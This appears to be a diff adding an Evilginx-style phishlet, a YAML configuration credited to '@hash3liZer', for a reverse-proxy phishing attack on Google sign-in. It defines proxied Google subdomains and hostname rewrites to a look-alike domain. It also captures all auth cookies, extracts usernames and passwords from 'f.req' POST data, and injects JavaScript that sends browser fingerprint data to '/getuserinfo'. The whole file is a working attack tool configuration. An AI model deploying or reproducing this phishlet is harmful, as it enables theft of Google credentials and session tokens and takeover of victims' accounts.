@@ -1,0 +1,95 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts-google.com.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'ssl.gstatic.com', replace: 'ssl.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'play.google.com', replace: 'play.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'apis.google.com', replace: 'apis.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.google.com', replace: 'www.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: [".*,regexp"]
+  - domain: 'accounts.google.bg'
+    keys: [".*,regexp"]
+credentials:
+  username:
+    key: 'f.req'
+    search: '\],"([^"]*)"\]$'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: ',\["([^"]*)",'
+    type: 'post'
+  custom:
+    - key: 'useragent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'platform'
+      search: '(.*)'
+      type: 'post'
+auth_urls:
+  - '/CheckCookie'
+  - '/ManageAccount'
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+force_post:
+  - path: '/_/signin/sl/challenge'
+    search: 
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['.*?']
+    script: |
+      function serialize( obj ){
+        var str = [];
+        for (var p in obj){
+          if (obj.hasOwnProperty(p)) {
+            str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
+          }
+        }
+        return str.join("&");
+      }
+
+      function toPopulate(){
+        console.log( "Populating" );
+        var xhttp = new XMLHttpRequest();
+        var tosend = {
+          useragent : navigator.userAgent,
+          browser    : navigator.appName,
+          engine     : navigator.product,
+          platform   : navigator.platform,
+        }
+
+        xhttp.onreadystatechange = function(){
+          console.log( "Sent" );
+        }
+        xhttp.open( "POST", "/getuserinfo", true );
+        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        console.log( serialize( tosend ) );
+        xhttp.send( serialize( tosend ) );
+      }
+
+      console.log( "Reached here." );
+      setTimeout(toPopulate, 2000);
